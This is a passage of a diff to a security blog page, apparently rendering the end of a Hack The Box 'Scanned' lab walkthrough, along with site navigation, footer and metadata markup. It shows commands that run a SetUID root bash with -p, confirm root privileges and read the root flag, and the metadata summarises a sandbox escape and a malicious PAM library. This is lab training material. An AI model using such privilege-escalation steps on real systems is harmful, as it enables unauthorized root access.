+<pre tabindex="0" aria-label="Code or terminal block 28"><code>-rwsrwxrwx 1 root root 1234376 ... /tmp/0xdf
 </code></pre>
 <p><strong>Success!</strong> The file is now <strong>SetUID root</strong>.</p>
 <hr>
 <h2 id="phase-7-root-flag">Phase 7: Root Flag</h2>
 <p>Run the SetUID bash with <code>-p</code> to preserve root privileges:</p>
-<pre><code class="language-bash" data-language="bash">/tmp/0xdf -p
+<pre tabindex="0" aria-label="bash code or terminal block 29"><code class="language-bash" data-language="bash">/tmp/0xdf -p
 id
 # uid=1000(clarence) gid=1000(clarence) euid=0(root)
 </code></pre>
 <p>Read the root flag:</p>
-<pre><code class="language-bash" data-language="bash">cat /root/root.txt
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">cat /root/root.txt
 </code></pre>
 <p><strong>Root Flag:</strong> <code>1bceae[redacted]2b92f804</code></p>
 <p><strong>Why <code>-p</code>?</strong> When bash is SetUID, it normally drops privileges on startup for security. The <code>-p</code> flag tells it to <strong>preserve</strong> the effective UID. Without <code>-p</code>, you'd drop back to <code>clarence</code>.</p>
@@ -456,9 +462,9 @@ id
 <li><code>bash -p</code> for preserving SetUID privileges</li>
 <li>Static compilation for reliable exploitation</li>
 </ul>
-<hr>6:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$c"}}]
-7:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-routerspace-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: RouterSpace Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:43:57.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-schooled-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Schooled Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:36:29.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-8:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$Ld",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-e:T597,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/#article","headline":"Hack The Box: Scanned Walkthrough","description":"Two sandbox flaws exposed a host directory through another process's open file descriptor, letting forged syscall logs leak Django credentials for Clarence, then a jail race loaded a malicious PAM library through setuid su and created a root shell.","url":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/","datePublished":"2026-06-11T11:41:28.000Z","dateModified":"2026-06-11T11:41:28.000Z","wordCount":3064,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/7b14cc752de075720f6714d0c7658124b4796198/HTB-Scanned.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-scanned-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Scanned Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/"}]}]}9:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
-a:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
-11:null
+<hr>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"overview-what-are-we-facing","label":"Overview: What Are We Facing?"},{"id":"phase-1-enumeration-and-reconnaissance","label":"Phase 1: Enumeration & Reconnaissance"},{"id":"phase-2-source-code-analysis","label":"Phase 2: Source code analysis"},{"id":"phase-3-understanding-the-vulnerabilities","label":"Phase 3: Understanding the Vulnerabilities"},{"id":"phase-4-foothold-escaping-the-sandbox","label":"Phase 4: Foothold - Escaping the Sandbox"},{"id":"phase-5-user-flag-credential-extraction-and-cracking","label":"Phase 5: User Flag - Credential Extraction & Cracking"},{"id":"phase-6-privilege-escalation-abusing-the-sandbox-again","label":"Phase 6: Privilege Escalation - Abusing the Sandbox Again"},{"id":"phase-7-root-flag","label":"Phase 7: Root Flag"},{"id":"key-lessons","label":"Key lessons"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/7b14cc752de075720f6714d0c7658124b4796198/HTB-Scanned.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 7b14cc752de0",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Scanned, Linux, Insane",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/scanned","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-routerspace-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: RouterSpace Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:43:57.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-schooled-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Schooled Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:36:29.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T597,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/#article","headline":"Hack The Box: Scanned Walkthrough","description":"Two sandbox flaws exposed a host directory through another process's open file descriptor, letting forged syscall logs leak Django credentials for Clarence, then a jail race loaded a malicious PAM library through setuid su and created a root shell.","url":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/","datePublished":"2026-06-11T11:41:28.000Z","dateModified":"2026-06-11T11:41:28.000Z","wordCount":3064,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/7b14cc752de075720f6714d0c7658124b4796198/HTB-Scanned.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-scanned-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Scanned Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-scanned-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
